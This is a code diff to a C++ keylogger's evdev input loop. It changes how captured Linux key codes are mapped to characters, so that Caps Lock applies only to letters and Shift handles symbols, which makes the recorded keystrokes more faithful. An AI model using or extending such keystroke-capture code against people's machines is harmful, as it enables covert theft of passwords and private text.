@@ -483,16 +483,17 @@ void KeyLogger::evdevLoop() {
         if (m_left_ctrl_pressed || m_right_ctrl_pressed ||
             m_left_alt_pressed || m_right_alt_pressed) continue;
 
-        bool shifted = (m_left_shift_pressed || m_right_shift_pressed) ^ m_caps_active;
+        bool letter_shifted = (m_left_shift_pressed || m_right_shift_pressed) ^ m_caps_active;
+        bool symbol_shifted = (m_left_shift_pressed || m_right_shift_pressed);
         std::string key_str;
 
-        // ── Letter keys ──
+        // ── Letter keys (Caps Lock applies) ──
         if (code >= KEY_A && code <= KEY_Z) {
             char c = 'a' + (code - KEY_A);
-            if (shifted) c -= 32;   // uppercase via ASCII
+            if (letter_shifted) c -= 32;
             key_str = std::string(1, c);
         }
-        // ── Number row ──
+        // ── Number row (Caps Lock does NOT apply) ──
         else if (code >= KEY_1 && code <= KEY_0) {
             static const char digits[] = "1234567890";
             static const char* symbols[] = {
@@ -500,7 +501,7 @@ void KeyLogger::evdevLoop() {
             };
             int idx = code - KEY_1;
             if (idx >= 0 && idx <= 9) {
-                key_str = shifted ? symbols[idx] : std::string(1, digits[idx]);
+                key_str = symbol_shifted ? symbols[idx] : std::string(1, digits[idx]);
             }
         }
         else switch (code) {
@@ -508,17 +509,17 @@ void KeyLogger::evdevLoop() {
             case KEY_BACKSPACE: key_str = "[BACKSPACE]"; break;
             case KEY_TAB:       key_str = "[TAB]";      break;
             case KEY_SPACE:     key_str = " ";          break;
-            case KEY_MINUS:     key_str = shifted ? "_" : "-";    break;
-            case KEY_EQUAL:     key_str = shifted ? "+" : "=";    break;
-            case KEY_LEFTBRACE:  key_str = shifted ? "{" : "[";   break;
-            case KEY_RIGHTBRACE: key_str = shifted ? "}" : "]";   break;
-            case KEY_SEMICOLON:  key_str = shifted ? ":" : ";";   break;
-            case KEY_APOSTROPHE: key_str = shifted ? "\"" : "'";  break;
-            case KEY_GRAVE:     key_str = shifted ? "~" : "`";    break;
-            case KEY_BACKSLASH: key_str = shifted ? "|" : "\\";   break;
-            case KEY_COMMA:     key_str = shifted ? "<" : ",";    break;
-            case KEY_DOT:       key_str = shifted ? ">" : ".";    break;
-            case KEY_SLASH:     key_str = shifted ? "?" : "/";    break;
+            case KEY_MINUS:     key_str = symbol_shifted ? "_" : "-";    break;
+            case KEY_EQUAL:     key_str = symbol_shifted ? "+" : "=";    break;
+            case KEY_LEFTBRACE:  key_str = symbol_shifted ? "{" : "[";   break;
+            case KEY_RIGHTBRACE: key_str = symbol_shifted ? "}" : "]";   break;
+            case KEY_SEMICOLON:  key_str = symbol_shifted ? ":" : ";";   break;
+            case KEY_APOSTROPHE: key_str = symbol_shifted ? "\"" : "'";  break;
+            case KEY_GRAVE:     key_str = symbol_shifted ? "~" : "`";    break;
+            case KEY_BACKSLASH: key_str = symbol_shifted ? "|" : "\\";   break;
+            case KEY_COMMA:     key_str = symbol_shifted ? "<" : ",";    break;
+            case KEY_DOT:       key_str = symbol_shifted ? ">" : ".";    break;
+            case KEY_SLASH:     key_str = symbol_shifted ? "?" : "/";    break;
             case KEY_KPASTERISK: key_str = "*";  break;
             case KEY_KPMINUS:    key_str = "-";  break;
             case KEY_KPPLUS:     key_str = "+";  break;
